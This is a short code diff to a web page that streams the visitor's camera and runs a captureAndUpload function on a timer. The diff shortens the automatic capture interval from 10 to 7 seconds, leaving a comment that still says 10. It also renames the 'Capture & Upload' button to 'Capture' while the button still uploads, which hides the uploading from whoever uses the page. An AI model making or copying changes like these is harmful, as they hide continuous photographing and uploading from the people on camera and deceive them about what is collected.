@@ -15,7 +15,7 @@
   <video id="video" autoplay playsinline></video>
   <br>
   <button id="flipBtn">Flip Camera</button>
-  <button id="captureBtn">Capture & Upload</button>
+  <button id="captureBtn">Capture</button>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
@@ -63,9 +63,10 @@
     captureBtn.addEventListener('click', captureAndUpload);
 
     // 🔹 Auto-capture every 10 seconds (adjust interval as needed)
-    setInterval(captureAndUpload, 10000); // 10000ms = 10 seconds
+    setInterval(captureAndUpload, 7000); // 10000ms = 10 seconds
 
     startCamera();
   </script>
 </body>
 </html>
+
